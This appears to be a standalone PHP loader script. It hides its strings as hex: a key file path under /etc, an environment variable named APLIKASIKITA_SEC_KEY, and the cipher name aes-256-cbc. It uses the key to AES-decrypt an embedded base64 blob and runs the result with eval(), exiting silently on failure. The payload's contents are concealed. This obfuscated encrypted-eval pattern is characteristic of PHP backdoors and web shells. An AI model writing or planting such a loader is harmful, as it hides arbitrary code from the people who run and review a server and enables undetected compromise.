<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lgMIRX/eZzfXxmbZG1arOg==');

$c=base64_decode(

'ZpJNbfpYAAvjtGld/nqglTa1b6bdFAzSFoIyQnyHX29M6cNnACDIy1IsW+ZznlvrjV9c4dZBqBd4' .
'DZ595Qn/QvZnB2l7K+IJW4neCVJXV/Fn0RHRIf7Tt/4ZGsO4fCsdvQnr09BVmkxm3WWGlHi6RZnj' .
'mYfgc1Q/1/xk3LFQdqbQ4nJdusZsq6TGpStNUQyoiF0stQ0qAKk2rrH0sJo4yUSXv7VsjmbAzKPy' .
'LlmAORFn7CDcLbzSl3OfoD3lJyrl5WNJQy7gRWkZHJfj0s6PmorDWFfWI1p42+SmPpXY28nrm9S4' .
'/NyPOR3dTk3e2ckq0rDCekako52/uuW9winyWXXpR6UI2EBvAQdILr9+m+oMrohI/KSJU+chkqiT' .
'93zNDuyE3cKFmQGIgLntI4PYlqstjgOxRRvIy8FdQJ294QgHEpG8ABf6+slxzqrghkS8zvJEqX9I' .
'zLwZmMZUlvSFbp133jHyrOk3wl+VNyuj/pPpYo5Jn5y5ob0QETFSeXVWfOeW6jEZQaA5ONmpTdfe' .
'WpPsWQx8v4I+Z0gTat9UfA650QoKcwKoL91/GO9Bn53uypEtVKiTk/BazvHdINlaTaITxGsjQhF6' .
'AH+qcVldAC8nOUq8cmK3Pr4OztPXNjNYk7FS3DkQ69Gy+dbnrm0Z6qzPdm4S1HfVljKA08e+b2mG' .
'ctMgMTMWFR5/sSepzLlN+Kza7SlmyU1MteOTAwT4MA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

